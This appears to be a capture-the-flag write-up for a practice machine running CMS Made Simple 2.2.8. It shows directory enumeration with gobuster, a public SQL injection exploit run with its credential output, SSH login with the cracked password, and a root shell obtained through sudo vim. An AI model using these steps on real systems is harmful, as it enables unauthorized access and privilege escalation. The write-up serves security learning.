Finding all paths of a website using a wordlist.
In this instance we are using gobuster with a DirBuster word list

gobuster dir -w /opt/node_modules/dirbuster/lists/directory-list-2.3-medium.txt -u http://10.10.248.51
FLAGS
-u specify url
-w link wordlist

Result:
/simple
/server-status

The later one is inaccessible.

By visiting the /simple we can see that CMS Made Simple is being hosted, with a version of 2.2.8
Doing a simple google search for CVEs for this shows a vulnerability for remote SQL Injections prior to version 2.2.10

The Details of the CVE can be found in -- https://packetstormsecurity.com/files/152356/CMS-Made-Simple-SQL-Injection.html

There is code to run the SQL Injection in which we have to pass in a IP Address.
Install required libraries and then run the application while passing in relevant data with flags.

Command - python app.py -u http://10.10.248.51 --crack -w /opt/node_modules/dirbuster/lists/directory-list-2.3-medium.txt    

After that you will recieve the following details :-
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret

now you can login with these credentials using ssh but it is required to specify ssh port 2222, (not the normal port)
Command - ssh mitch@10.10.248.51 -p 2222

We can now see the flag in the home directory "G00d j0b, keep up!"


now using the command sudo -l, we can find out which user can run some applications witg root priviliges, and we can see that Mitch can use vim.
so we sudo open vim and get a shell by typing in :!sh to spawn a shell within vim that has root access.
